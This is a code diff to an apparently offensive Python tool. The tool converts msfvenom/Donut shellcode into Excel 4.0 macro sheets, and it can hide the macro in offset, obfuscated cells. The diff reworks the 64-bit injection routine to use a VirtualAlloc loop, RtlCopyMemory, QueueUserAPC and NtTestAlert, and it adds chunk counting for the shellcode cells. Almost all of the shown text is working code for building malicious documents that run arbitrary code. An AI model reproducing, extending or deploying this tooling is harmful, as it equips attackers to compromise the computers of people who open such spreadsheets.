@@ -24,7 +24,7 @@ Options:
 Requirements:
 	Donut (pip3 install donut-shellcode)
 	MSFVenom (default installed on Kali Linux)
-	MCS - Mono C# compiler (default installed on Kali Linux)
+	MCS - Mono C# compiler (apt-get install mono-complete)
 
 Input File:
 	CS source code with a method containing your payload. Recommend using parent PID spoofing.
@@ -74,20 +74,20 @@ def main():
 			sys.exit()
 
 	#Generate shellcode in x86 and x64 archs 
-	x86Shellcode, x86Size = generateShellcode(args,'x86')
-	x64Shellcode, x64Size = generateShellcode(args,'x64')
+	x86Shellcode, x86Size, x86Count = generateShellcode(args,'x86')
+	x64Shellcode, x64Size, x64Count = generateShellcode(args,'x64')
 
 	frames = []
 	if not args.obfuscation:
 		#Generate unobfuscated macro code
-		columnA = generateClearInstructions(args, x86Size, x64Size)
+		columnA = generateClearInstructions(args, x86Size, x64Size, x86Count, x64Count)
 		#Create blank dataframe to balance dfD in obfuscated flag
 		dfD = pd.DataFrame()
 	else:
 		#Random offset, so code isn't immediately visible on sheet open
-		offset = random.randint(99,650)
+		offset = random.randint(99,149)
 		#Generate obfuscated macro
-		columnA, dfD = generateObfuscatedInstructions(args, x86Size, x64Size, offset)
+		columnA, dfD = generateObfuscatedInstructions(args, x86Size, x64Size, offset, x86Count, x64Count)
 		#Create empty dataframes for offset
 		for i in range(1,offset):
 			frames.append(pd.DataFrame(columns=[i]))
@@ -232,14 +232,22 @@ def generateShellcode(args, arch):
 	#Max 255 per cell, so chunk, then process into =CHAR(2)&CHAR(234) format
 	#https://gist.githubusercontent.com/Arno0x/1ec189d6bee3e92fdef1d72a72899b1d/raw/b97a190d4b88c502347d074b08d624a76621b314/transformFile.py
 	column = ''
-	for chunk in chunks(binary, 255):
+	count = 1
+	if arch == "x86":
+		chunkSize = 255
+	else:
+		chunkSize = 10
+	for chunk in chunks(binary, chunkSize):
 		column += '='
 		for b in chunk:
 			column += 'CHAR({})&'.format(ord(b))
 		column = column[0:-1] + '\r\n'
+		count += 1
 	column += 'excel\r\n'
+	count += 1
+	count = str(count)
 
-	return column, size
+	return column, size, count
 
 def getColumnLetters(colNumber):
 	#Function modified from (https://www.geeksforgeeks.org/find-excel-column-name-given-number/)
@@ -292,7 +300,7 @@ def generateRandomCols(offset):
 	cols['trackingColA1'] = getColumnLetters(cols['trackingColR1'])
 	return cols
 
-def generateClearInstructions(args, x86Size, x64Size):
+def generateClearInstructions(args, x86Size, x64Size, x86Count, x64Count):
 	
 	#Refer to function above to get a sense for what these cols mean
 	mainCol = "A"
@@ -330,8 +338,9 @@ def generateClearInstructions(args, x86Size, x64Size):
 	columnAList.append('=IF(ISNUMBER(SEARCH("32",GET.WORKSPACE(1))),GOTO(' + mainCol + '10),GOTO(' + mainCol + '21))\r\n')
 	
 	#32-bit valloc + shellcode selection
+	#VirtualAlloc>WriteProcessMemory>RtlCopyMemory
 	columnAList.append('=Valloc(0,' + str(x86Size) + ',4096,64)\r\n')
-	columnAList.append('=SELECT(' + x86Col + '1:' + x86Col + '999,' + x86Col + '1)\r\n')
+	columnAList.append('=SELECT(' + x86Col + '1:' + x86Col + x86Count + ',' + x86Col + '1)\r\n')
 	columnAList.append('=SET.VALUE(' + trackingCol + '1,0)\r\n')
 	columnAList.append('=WHILE(ACTIVE.CELL()<>"excel")\r\n')
 	columnAList.append('=SET.VALUE(' + trackingCol + '2,LEN(ACTIVE.CELL()))\r\n')
@@ -343,16 +352,29 @@ def generateClearInstructions(args, x86Size, x64Size):
 	columnAList.append('=HALT()\r\n')
 	
 	#64-bit valloc + shellcode selection
-	columnAList.append('=Valloc(0,' + str(x64Size) + ',4096,64)\r\n')
-	columnAList.append('=SELECT(' + x64Col + '1:' + x64Col + '999,' + x64Col + '1)\r\n')
+	#VirtualAlloc>RtlCopyMemory>QueueUserAPC>NtTestAlert
+	#Cycling through addresses to hack the 4-byte vs. 8-byte int issue with 32 vs. 64-bit arch
+	#increasing by 262144 each time to improve chances of finding a good spot
+	columnAList.append('1342177280\r\n')
+	columnAList.append('0\r\n')
+	columnAList.append('=WHILE(' + mainCol + '22=0)\r\n')
+	columnAList.append('=SET.VALUE(' + mainCol + '22,Valloc(' + mainCol + '21,' + str(x64Size) + ',12288,64))\r\n')
+	columnAList.append('=SET.VALUE(' + mainCol + '21,' + mainCol + '21+262144)\r\n')
+	columnAList.append('=NEXT()\r\n')
+	columnAList.append('=REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)\r\n')
+	columnAList.append('=REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)\r\n')
+	columnAList.append('=REGISTER("ntdll","NtTestAlert","J","Go",,1,9)\r\n')
+	columnAList.append('=SELECT(' + x64Col + '1:' + x64Col + x64Count + ',' + x64Col + '1)\r\n')
 	columnAList.append('=SET.VALUE(' + trackingCol + '1,0)\r\n')
 	columnAList.append('=WHILE(ACTIVE.CELL()<>"EXCEL")\r\n')
 	columnAList.append('=SET.VALUE(' + trackingCol + '2,LEN(ACTIVE.CELL()))\r\n')
-	columnAList.append('=WProcessMemory(-1,' + mainCol + '21+(' + trackingCol + '1*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)\r\n')
+	columnAList.append('=RTL(' + mainCol + '22+(' + trackingCol + '1*10),ACTIVE.CELL(),LEN(ACTIVE.CELL()))\r\n')
 	columnAList.append('=SET.VALUE(' + trackingCol + '1,' + trackingCol + '1+1)\r\n')
 	columnAList.append('=SELECT(,"R[1]C")\r\n')
 	columnAList.append('=NEXT()\r\n')
-	columnAList.append('=CThread(0,0,' + mainCol + '21,0,0,0)\r\n')
+	columnAList.append('=Queue(' + mainCol + '22,-2,0)\r\n')
+	columnAList.append('=Go()\r\n')
+	columnAList.append('=SET.VALUE(A22,0)\r\n')
 	columnAList.append('=HALT()\r\n')
 
 	columnA = ""
@@ -361,7 +383,7 @@ def generateClearInstructions(args, x86Size, x64Size):
 
 	return columnA
 
-def generateObfuscatedInstructions(args,x86Size, x64Size, offset):
+def generateObfuscatedInstructions(args,x86Size, x64Size, offset, x86Count, x64Count):
 	
 	#Generate random column offset
 	cols = generateRandomCols(offset)
@@ -397,7 +419,7 @@ def generateObfuscatedInstructions(args,x86Size, x64Size, offset):
 	
 	#32-bit valloc + shellcode selection
 	columnAList.append('=Valloc(0,' + str(x86Size) + ',4096,64)\r\n')
-	columnAList.append('=SELECT(R1C' + cols['x86ColR1'] + ':R999C' + cols['x86ColR1'] + ',R1C' + cols['x86ColR1'] + ')\r\n')
+	columnAList.append('=SELECT(R1C' + cols['x86ColR1'] + ':R' + x86Count + 'C' + cols['x86ColR1'] + ',R1C' + cols['x86ColR1'] + ')\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
 	columnAList.append('=WHILE(ACTIVE.CELL()<>"excel")\r\n')
 	columnAList.append('=SET.VALUE(R2C' + cols['trackingColR1'] + ',LEN(ACTIVE.CELL()))\r\n')
@@ -409,18 +431,28 @@ def generateObfuscatedInstructions(args,x86Size, x64Size, offset):
 	columnAList.append('=HALT()\r\n')
 	
 	#64-bit valloc + shellcode selection
-	columnAList.append('=Valloc(0,' + str(x64Size) + ',4096,64)\r\n')
-	columnAList.append('=SELECT(R1C' + cols['x64ColR1'] + ':R999C' + cols['x64ColR1'] + ',R1C' + cols['x64ColR1'] + ')\r\n')
+	columnAList.append('1342177280\r\n')
+	columnAList.append('0\r\n')
+	columnAList.append('=WHILE(R22C' + cols['actionColR1'] + '=0)\r\n')
+	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',Valloc(R21C' + cols['actionColR1'] + ',' + str(x64Size) + ',12288,64))\r\n')
+	columnAList.append('=SET.VALUE(R21C' + cols['actionColR1'] + ',R21C' + cols['actionColR1'] + '+262144)\r\n')
+	columnAList.append('=NEXT()\r\n')
+	columnAList.append('=REGISTER("Kernel32","RtlCopyMemory","JJCJ","RTL",,1,9)\r\n')
+	columnAList.append('=REGISTER("Kernel32","QueueUserAPC","JJJJ","Queue",,1,9)\r\n')
+	columnAList.append('=REGISTER("ntdll","NtTestAlert","J","Go",,1,9)\r\n')
+	columnAList.append('=SELECT(R1C' + cols['x64ColR1'] + ':R' + x64Count + 'C' + cols['x64ColR1'] + ',R1C' + cols['x64ColR1'] + ')\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',0)\r\n')
 	columnAList.append('=WHILE(ACTIVE.CELL()<>"EXCEL")\r\n')
 	columnAList.append('=SET.VALUE(R2C' + cols['trackingColR1'] + ',LEN(ACTIVE.CELL()))\r\n')
-	columnAList.append('=WProcessMemory(-1,R21C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*255),ACTIVE.CELL(),LEN(ACTIVE.CELL()),0)\r\n')
+	columnAList.append('=RTL(R22C' + cols['actionColR1'] + '+(R1C' + cols['trackingColR1'] + '*10),ACTIVE.CELL(),LEN(ACTIVE.CELL()))\r\n')
 	columnAList.append('=SET.VALUE(R1C' + cols['trackingColR1'] + ',R1C' + cols['trackingColR1'] + '+1)\r\n')
 	columnAList.append('=SELECT(,"R[1]C")\r\n')
 	columnAList.append('=NEXT()\r\n')
-	columnAList.append('=CThread(0,0,R21C' + cols['actionColR1'] + ',0,0,0)\r\n')
+	columnAList.append('=Queue(R22C' + cols['actionColR1'] + ',-2,0)\r\n')
+	columnAList.append('=Go()\r\n')
+	columnAList.append('=SET.VALUE(R22C' + cols['actionColR1'] + ',0)\r\n')
 	columnAList.append('=HALT()\r\n')
-
+	
 	#Obfuscate commands
 	#General idea: Create a column with all the letters and symbols we see in col A.
 	#Then iterate through the entire columnA string and change it to this format:
